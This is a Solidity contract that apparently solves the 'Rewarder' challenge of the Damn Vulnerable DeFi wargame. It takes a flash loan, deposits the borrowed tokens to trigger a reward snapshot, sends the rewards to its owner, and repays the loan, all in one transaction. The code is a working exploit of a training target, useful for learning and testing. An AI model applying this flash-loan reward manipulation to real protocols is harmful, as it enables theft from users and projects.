// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool, RewardToken} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";

import "forge-std/console.sol";

contract Exploit {
    address public dvtTokenAddr;
    address public flashloanPoolAddr;
    address public rewardPoolAddr;
    address public owner;

    event LogAddress(address addressToLog);

    constructor(
        address _dvtTokenAddr,
        address _flashloanPoolAddr,
        address _rewardPoolAddr,
        address _owner
    ) {
        dvtTokenAddr = _dvtTokenAddr;
        flashloanPoolAddr = _flashloanPoolAddr;
        rewardPoolAddr = _rewardPoolAddr;
        owner = _owner;
    }

    function requestFlashloan(uint256 amount) external {
        FlashLoanerPool(flashloanPoolAddr).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        RewardToken rewardToken = RewardToken(
            TheRewarderPool(rewardPoolAddr).rewardToken()
        );
        DamnValuableToken dvt = DamnValuableToken(dvtTokenAddr);
        TheRewarderPool rewardPool = TheRewarderPool(rewardPoolAddr);

        dvt.approve(rewardPoolAddr, amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        rewardPool.withdraw(amount);
        dvt.transfer(flashloanPoolAddr, amount);
    }
}
